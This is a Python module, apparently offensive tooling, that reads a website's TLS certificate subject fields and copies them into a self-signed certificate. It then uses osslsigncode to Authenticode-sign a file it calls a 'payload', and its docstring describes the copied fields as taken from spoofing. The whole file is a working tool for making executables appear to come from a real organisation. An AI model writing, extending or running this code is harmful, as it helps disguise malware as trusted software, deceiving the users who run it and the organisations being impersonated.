import pathlib
import subprocess
import tempfile
import ssl
import socket
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
from cryptography.hazmat.backends import default_backend
from datetime import datetime, timedelta, timezone

def get_remote_cert_details(url: str) -> dict:
    """
    Scrapes detailed X.509 attributes from a URL.
    Returns a dict with keys: C, ST, L, O, OU, CN
    """
    hostname = url.replace("https://", "").replace("http://", "").split("/")[0]
    if ":" in hostname: hostname = hostname.split(":")[0]
    port = 443

    cert_attributes = {
        "C": "US", "ST": None, "L": None, 
        "O": None, "OU": None, "CN": hostname
    }

    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((hostname, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                der_cert = ssock.getpeercert(binary_form=True)
                cert = x509.load_der_x509_certificate(der_cert, default_backend())
                oid_map = {
                    NameOID.COUNTRY_NAME: "C",
                    NameOID.STATE_OR_PROVINCE_NAME: "ST",
                    NameOID.LOCALITY_NAME: "L",
                    NameOID.ORGANIZATION_NAME: "O",
                    NameOID.ORGANIZATIONAL_UNIT_NAME: "OU",
                    NameOID.COMMON_NAME: "CN"
                }
                for attribute in cert.subject:
                    oid = attribute.oid
                    if oid in oid_map:
                        cert_attributes[oid_map[oid]] = attribute.value
                
                if not cert_attributes["O"]: cert_attributes["O"] = cert_attributes["CN"]

                return cert_attributes
                
    except Exception as e:
        raise RuntimeError(f"Cert scrape failed for {hostname}: {e}")

def self_sign_payload(payload_path: pathlib.Path, 
                      subject_cn: str,
                      org_name: str,
                      full_details: dict = None) -> None:
    """
    Signs payload. 
    If 'full_details' is provided (from spoofing), uses those extended fields.
    Otherwise uses basic subject_cn/org_name (manual mode).
    """
    if not payload_path.exists(): return

    with tempfile.TemporaryDirectory() as temp_dir:
        cert_path = pathlib.Path(temp_dir) / "cert.p12"
        signed_temp = pathlib.Path(temp_dir) / payload_path.name
        
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        
        name_attrs = []
        
        if full_details:
            if full_details.get("C"): name_attrs.append(x509.NameAttribute(NameOID.COUNTRY_NAME, full_details["C"]))
            if full_details.get("ST"): name_attrs.append(x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, full_details["ST"]))
            if full_details.get("L"): name_attrs.append(x509.NameAttribute(NameOID.LOCALITY_NAME, full_details["L"]))
            if full_details.get("O"): name_attrs.append(x509.NameAttribute(NameOID.ORGANIZATION_NAME, full_details["O"]))
            if full_details.get("OU"): name_attrs.append(x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, full_details["OU"]))
            if full_details.get("CN"): name_attrs.append(x509.NameAttribute(NameOID.COMMON_NAME, full_details["CN"]))
        else:
            name_attrs = [
                x509.NameAttribute(NameOID.COMMON_NAME, subject_cn),
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, org_name),
            ]

        subject = issuer = x509.Name(name_attrs)
        
        cert = (x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(private_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.now(timezone.utc))
                .not_valid_after(datetime.now(timezone.utc) + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .sign(private_key, hashes.SHA256()))
        
        cert_path.write_bytes(
            pkcs12.serialize_key_and_certificates(
                name=b"signing",
                key=private_key,
                cert=cert,
                cas=None,
                encryption_algorithm=serialization.NoEncryption()
            )
        )
        
        subprocess.check_call([
            "osslsigncode", "sign",
            "-pkcs12", str(cert_path),
            "-t", "http://timestamp.digicert.com",
            "-in", str(payload_path),
            "-out", str(signed_temp),
            "-h", "sha256"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        signed_temp.replace(payload_path)
